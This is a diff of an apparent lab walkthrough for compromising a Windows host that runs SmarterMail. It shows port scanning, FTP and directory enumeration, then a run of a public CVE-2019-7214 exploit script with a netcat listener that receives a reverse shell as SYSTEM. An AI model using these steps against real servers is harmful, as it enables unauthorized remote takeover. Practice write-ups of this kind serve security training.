@@ -1,4 +1,4 @@
-***Reconnaissance***
+***1: Reconnaissance***
 
 ```
 PORT     STATE SERVICE       VERSION
@@ -43,7 +43,7 @@ Host script results:
 |_  start_date: N/A
 ```
 
-***21 FTP***
+***2: 21 FTP***
 ```
 $ ftp 192.168.71.65
 Connected to 192.168.71.65.
@@ -81,6 +81,39 @@ $ cat 2020.05.12-administrative.log
 03:35:55.820 [192.168.118.6] Webmail Login successful: With user admin
 03:36:00.195 [192.168.118.6] User admin@ calling set setup wizard settings
 03:36:08.242 [192.168.118.6] User admin@ logging out
+```
+***3: 80 IIS 10***
+```
+http://192.168.71.65/
+IIS Splash Page
+
+# nothing in gobuster
+```
+***4: 9998 IIS 10***
+```
+http://192.168.71.65:9998/interface/root#/login
+SmarterMail Login Page
+
+$ gobuster dir -u http://192.168.71.65:9998 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x asp,apsx,html,txt -t 80
+===============================================================
+/download             (Status: 500) [Size: 36]
+/services             (Status: 301) [Size: 158] [--> http://192.168.71.65:9998/services/]
+/reports              (Status: 301) [Size: 157] [--> http://192.168.71.65:9998/reports/]
+/scripts              (Status: 301) [Size: 157] [--> http://192.168.71.65:9998/scripts/]
+/api                  (Status: 302) [Size: 132] [--> /interface/root]
+/interface            (Status: 301) [Size: 159] [--> http://192.168.71.65:9998/interface/]
+
+SmarterMail Exploit
+Using https://raw.githubusercontent.com/devzspy/CVE-2019-7214/master/cve-2019-7214.py
+
+$ python3 cve-2019-7214.py 
+$ nc -lvnp 9998
+
+listening on [any] 9998 ...
+connect to [192.168.49.71] from (UNKNOWN) [192.168.71.65] 49740
+
+PS C:\Windows\system32> whoami
+nt authority\system
 ```
 
 
